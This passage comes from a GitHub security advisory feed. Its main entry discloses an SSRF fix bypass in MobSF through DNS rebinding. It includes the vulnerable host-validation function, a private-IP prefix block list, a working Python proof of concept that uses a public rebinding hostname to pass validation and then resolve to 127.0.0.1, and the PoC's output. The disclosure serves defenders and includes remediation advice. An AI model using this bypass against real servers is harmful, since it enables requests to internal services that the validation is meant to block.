<li><a href="https://github.com/aws/aws-sam-cli/pull/7865">https://github.com/aws/aws-sam-cli/pull/7865</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/AWS-2025-008">https://aws.amazon.com/security/security-bulletins/AWS-2025-008</a></li>
<li><a href="https://github.com/advisories/GHSA-px37-jpqx-97q9">https://github.com/advisories/GHSA-px37-jpqx-97q9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-px37-jpqx-97q9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T22:36:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mobsf] Mobile Security Framework (MobSF) has a SSRF Vulnerability fix bypass on assetlinks_check with DNS Rebinding]]></title>
        <id>https://github.com/advisories/GHSA-fcfq-m8p6-gw56</id>
        <link href="https://github.com/advisories/GHSA-fcfq-m8p6-gw56"/>
        <updated>2025-03-31T23:32:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The latest deployed fix for the SSRF vulnerability is through the use of the call <code>valid_host()</code>. The code available at lines <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/ae34f7c055aa64fca58e995b70bc7f19da6ca33a/mobsf/MobSF/utils.py#L907-L957">/ae34f7c055aa64fca58e995b70bc7f19da6ca33a/mobsf/MobSF/utils.py#L907-L957</a> is vulnerable to SSRF abuse using DNS rebinding technique.</p>
<h3 id="poc">PoC</h3>
<p>The following proof of concept: </p>
<pre><code class="language-python">def valid_host(host):
    """Check if host is valid."""
    try:
        prefixs = ('http://', 'https://')
        if not host.startswith(prefixs):
            host = f'http://{host}'
        parsed = urlparse(host)
        domain = parsed.netloc
        path = parsed.path
        if len(domain) == 0:
            # No valid domain
            return False, None
        if len(path) &gt; 0:
            # Only host is allowed
            return False, None
        if ':' in domain:
            # IPv6
            return False, None
        # Local network
        invalid_prefix = (
            '100.64.',
            '127.',
            '192.',
            '198.',
            '10.',
            '172.',
            '169.',
            '0.',
            '203.0.',
            '224.0.',
            '240.0',
            '255.255.',
            'localhost',
            '::1',
            '64::ff9b::',
            '100::',
            '2001::',
            '2002::',
            'fc00::',
            'fe80::',
            'ff00::')
        if domain.startswith(invalid_prefix):
            return False, None
        ip = socket.gethostbyname(domain)
        if ip.startswith(invalid_prefix):
            # Resolve dns to get IP
            return False, None
        return True, ip
    except Exception:
        return False, None

import random
import time
import socket
from urllib.parse import urlparse

if __name__ == '__main__':
    print("Generating random host ...", end=' ')     
    prefix = random.randint(999_999, 9_999_999)
    host = f"{prefix}-make-1.1.1.1-rebindfor30safter1times-127.0.0.1-rr.1u.ms"
    print("Done")
    print(f"Testing with '{host}' ... ", end=" ")
    valid, ip = valid_host(host)
    if valid:
        print(f"Successful Bypass")
        print(f" - Host initially resolved to: {ip}")
        print("Sleeping for 1 second ...")
        time.sleep(1)
        print(f" - Second use host will be resolved to: {socket.gethostbyname(host)}")
        print(f" - Third use host will be resolved to: {socket.gethostbyname(host)}")
        print("Sleeping for 30 seconds ...")
        time.sleep(30)
    else:
        print(f"Invalid host")
</code></pre>
<p>Yields : </p>
<pre><code>$ python3 poc.py
Generating random host ... Done
Testing with '5084216-make-1.1.1.1-rebindfor30safter1times-127.0.0.1-rr.1u.ms' ...  Successful Bypass
 - Host initially resolved to: 1.1.1.1
Sleeping for 1 second ...
 - Second use host will be resolved to: 127.0.0.1
 - Third use host will be resolved to: 127.0.0.1
Sleeping for 30 seconds ...
</code></pre>
<p>Which generate an initlal random url that leverages dns rebinding after 1 time host resolution and remains to that IP for 30 seconds.
As you can notice the initial resolution was pointing to <code>1.1.1.1</code>. The second time the IP was resolved to <code>127.0.0.1</code>. Such an attack could be adjusted for other IP addresses.</p>
<h3 id="impact">Impact</h3>
<p>The usual impact of Server-side request forgery.</p>
<h3 id="remediation">Remediation</h3>
<ul>
<li>Avoid the use of <code>socket.gethostbyname()</code> since it issues and DNS query.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-fcfq-m8p6-gw56">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-fcfq-m8p6-gw56</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/4b8bab5a9858c69fe13be4631b82d82186e0d3bd">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/4b8bab5a9858c69fe13be4631b82d82186e0d3bd</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31116">https://nvd.nist.gov/vuln/detail/CVE-2025-31116</a></li>
<li><a href="https://github.com/advisories/GHSA-fcfq-m8p6-gw56">https://github.com/advisories/GHSA-fcfq-m8p6-gw56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fcfq-m8p6-gw56</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T17:23:21.000Z</published>
    </entry>
</feed>